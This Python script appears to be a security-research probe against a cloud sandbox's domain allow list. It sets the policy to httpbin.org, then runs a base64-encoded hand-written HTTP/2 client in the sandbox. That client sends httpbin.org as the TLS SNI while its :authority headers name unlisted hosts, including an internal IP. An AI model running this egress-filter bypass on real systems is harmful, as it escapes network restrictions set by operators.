# -*- coding: utf-8 -*-
"""h2 authority 混淆: 手写 h2 客户端, :authority 伪头 vs 连接 SNI
R1: :authority=httpbin.org (基线, 预期 200)
R2: :authority=example.com (非 allow -> 代理按什么决策?)
R3: :authority=172.31.0.2 (IP 形式)
R4: :authority=evil.com + :path 大请求 (响应体观察)
"""
import base64, json, sys, time
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, cmd, TEAM, PROJ

c, r = api('GET', '/v2/sandboxes/npol1?teamId=%s&projectId=%s' % (TEAM, PROJ))
d = json.loads(r)
sid = d['sandbox']['currentSessionId']
print('npol1 sid:', sid, 'status:', d['sandbox']['status'], flush=True)
if d['sandbox'].get('status') != 'running':
    c, r = api('GET', '/v2/sandboxes/npol1?teamId=%s&projectId=%s&resume=true' % (TEAM, PROJ))
    d = json.loads(r)
    sid = d['sandbox']['currentSessionId']
    print('resumed sid:', sid, flush=True)
    time.sleep(5)

def run(tag, sc, maxlen=1500):
    c, r = cmd(sid, 'sh', ['-c', sc], timeout_ms=90000)
    out = ''
    for line in r.splitlines():
        if '"data"' in line:
            try:
                out += json.loads(line).get('data', '')
            except Exception:
                pass
    print('[%s] %s' % (tag, out[:maxlen]), flush=True)
    return out

api('POST', '/v2/sandboxes/sessions/%s/network-policy?teamId=%s' % (sid, TEAM),
    {"mode": "custom", "allowedDomains": ["httpbin.org"]})
time.sleep(3)

H2_CODE = '''import socket, ssl, sys

def hp_lit(name_idx, value):
    v = value.encode()
    if len(v) < 127:
        return bytes([0x40 | name_idx, len(v)]) + v
    return bytes([0x40 | name_idx, 127, len(v)]) + v

def hp_lit_new(name, value):
    v = value.encode()
    return b'\\x00' + bytes([len(name)]) + name.encode() + bytes([len(v)]) + v

def build_headers(stream, authority, path, end_stream=False):
    blocks = [b'\\x82', b'\\x87']  # :method GET, :scheme https
    blocks.append(hp_lit(1, authority))   # :authority
    blocks.append(hp_lit(4, path))        # :path
    h = b''.join(blocks)
    flags = 0x04 | (0x01 if end_stream else 0)
    return b'\\x00\\x00' + bytes([len(h)]) + bytes([0x01, flags]) + stream.to_bytes(4, 'big') + h

def read_frame(s):
    hdr = b''
    while len(hdr) < 9:
        d = s.recv(9 - len(hdr))
        if not d: return None
        hdr += d
    ln = int.from_bytes(hdr[0:3], 'big')
    body = b''
    while len(body) < ln:
        d = s.recv(ln - len(body))
        if not d: return None
        body += d
    return hdr[3], hdr[4], hdr[5:9], body  # type, flags, stream, body

def h2_get(authority, path='/anything', connect_ip='1.1.1.1'):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_alpn_protocols(['h2'])
        s = ctx.wrap_socket(socket.create_connection((connect_ip, 443), timeout=6),
                            server_hostname='httpbin.org')
        print('ALPN', s.selected_alpn_protocol(), flush=True)
        # 模仿 curl 时序: preface + 空 SETTINGS + HEADERS
        s.sendall(b'PRI * HTTP/2.0\\r\\n\\r\\nSM\\r\\n\\r\\n')  # connection preface
        s.sendall(b'\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00')  # 空 SETTINGS
        s.sendall(build_headers(1, authority, path, end_stream=True))
        # 读帧: SETTINGS->ACK, HEADERS(响应), DATA, GOAWAY
        data = b''
        s.settimeout(7)
        try:
            while len(data) < 800:
                f = read_frame(s)
                if not f: break
                if f[0] == 4 and not (f[1] & 1):
                    s.sendall(b'\\x00\\x00\\x00\\x04\\x01\\x00\\x00\\x00\\x00\\x00')
                if f[0] == 0:
                    data += f[3]
                if f[0] == 7:
                    print('GOAWAY', f[3][:20], flush=True)
                    break
        except Exception as e:
            print('RECV_ERR', type(e).__name__, flush=True)
        print('AUTH=%s BODY_HEAD=%r' % (authority, data[:160]), flush=True)
        s.close()
    except Exception as e:
        print('AUTH=%s ERR %s %s' % (authority, type(e).__name__, str(e)[:80]), flush=True)

for auth in ['httpbin.org', 'example.com', '172.31.0.2', 'evil.example.com']:
    h2_get(auth)
print('H2AUTH_DONE')
'''

b64 = base64.b64encode(H2_CODE.encode()).decode()
run('R1-h2auth', 'echo %s | base64 -d | python3' % b64, maxlen=1800)

print('=== H2AUTH DONE ===', flush=True)
